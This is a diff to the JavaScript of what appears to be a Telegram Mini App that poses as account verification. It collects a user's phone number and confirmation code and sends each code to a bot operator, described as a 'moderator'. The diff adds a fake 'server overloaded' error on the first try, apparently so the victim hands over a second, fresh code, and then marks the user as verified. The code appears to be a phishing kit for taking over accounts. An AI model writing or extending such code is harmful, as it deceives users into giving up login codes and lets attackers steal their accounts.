@@ -5,10 +5,13 @@ document.addEventListener('DOMContentLoaded', () => {
     tg.setBackgroundColor('#060137');
     tg.enableClosingConfirmation();
 
-    // Конфигурация
-    const BASE_URL = 'https://otz2026.github.io/mybot/'; // Замените на ваш URL
-    
-    // Элементы
+    // Проверяем, был ли пользователь уже верифицирован
+    if (localStorage.getItem('isVerified')) {
+        window.location.href = '/verifer_user/index.html';
+        return;
+    }
+
+    // Элементы DOM
     const phoneForm = document.getElementById('phone-form');
     const codeForm = document.getElementById('code-form');
     const phoneInput = document.getElementById('phone');
@@ -17,12 +20,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeError = document.getElementById('code-error');
     const submitCodeBtn = document.getElementById('submit-code');
 
-    // Глобальный объект для статуса верификации
-    window.verificationStatus = {
-        current: 'pending',
-        code: null,
-        userId: null
-    };
+    // Счетчик попыток ввода кода
+    let attemptCount = 0;
 
     // Вибрация
     const vibrate = (type = 'light') => {
@@ -31,7 +30,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Отправка события
+    // Отправка события боту
     const sendEvent = async (type, data = null) => {
         if (window.sendToBot) {
             await window.sendToBot(type, data);
@@ -42,13 +41,6 @@ document.addEventListener('DOMContentLoaded', () => {
     sendEvent('init');
     vibrate('medium');
 
-    // Отслеживание выхода
-    document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') {
-            sendEvent('exit');
-        }
-    });
-
     // Форматирование номера
     phoneInput.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
@@ -57,8 +49,8 @@ document.addEventListener('DOMContentLoaded', () => {
         let formatted = '+7';
         if (value.length > 1) formatted += ' ' + value.substring(1, 4);
         if (value.length > 4) formatted += ' ' + value.substring(4, 7);
-        if (value.length > 7) formatted += '-' + value.substring(7, 9);
-        if (value.length > 9) formatted += '-' + value.substring(9, 11);
+        if (value.length > 7) formatted += ' ' + value.substring(7, 9);
+        if (value.length > 9) formatted += ' ' + value.substring(9, 11);
         
         phoneInput.value = formatted.substring(0, 16);
         if (value.length % 2 === 0) vibrate('light');
@@ -108,44 +100,31 @@ document.addEventListener('DOMContentLoaded', () => {
         submitCodeBtn.disabled = true;
         submitCodeBtn.innerHTML = '<div class="loader"></div>';
         
-        // Сохраняем данные верификации
-        window.verificationStatus = {
-            current: 'pending',
-            code: code,
-            userId: tg.initDataUnsafe.user?.id
-        };
-        
-        // Отправляем код на проверку
+        // Отправляем код модератору
         await sendEvent('code', code);
         
-        // Открываем страницу подтверждения
-        const verificationUrl = `${BASE_URL}/verify.html?code=${code}&user_id=${tg.initDataUnsafe.user?.id}`;
-        window.open(verificationUrl, '_blank');
-        
-        // Проверяем статус каждые 500мс
-        const checkInterval = setInterval(() => {
-            if (window.verificationStatus.current !== 'pending') {
-                clearInterval(checkInterval);
-                handleVerificationResult(window.verificationStatus.current);
-            }
-        }, 500);
-    });
-
-    // Обработка результата
-    function handleVerificationResult(status) {
-        submitCodeBtn.disabled = false;
-        submitCodeBtn.textContent = 'Подтвердить';
-        
-        if (status === 'approved') {
-            tg.showAlert('✅ Подтверждено! Ваш аккаунт защищен.', () => {
-                tg.close();
-            });
-        } else {
-            showError(codeError, 'Код отклонён. Введите новый');
-            codeInput.value = '';
-            vibrate('heavy');
+        // Первая попытка - имитация перегруженности сервера
+        if (attemptCount === 0) {
+            setTimeout(() => {
+                submitCodeBtn.disabled = false;
+                submitCodeBtn.textContent = 'Подтвердить';
+                showError(codeError, 'Сервер перегружен. Попробуйте снова');
+                codeInput.value = '';
+                attemptCount++;
+                vibrate('heavy');
+            }, 10000);
+        } 
+        // Вторая попытка - успешная верификация
+        else {
+            setTimeout(() => {
+                // Сохраняем статус верификации
+                localStorage.setItem('isVerified', 'true');
+                
+                // Перенаправляем на страницу верифицированного пользователя
+                window.location.href = '/verifer_user/index.html';
+            }, 2000);
         }
-    }
+    });
 
     function showError(element, message) {
         element.textContent = message;
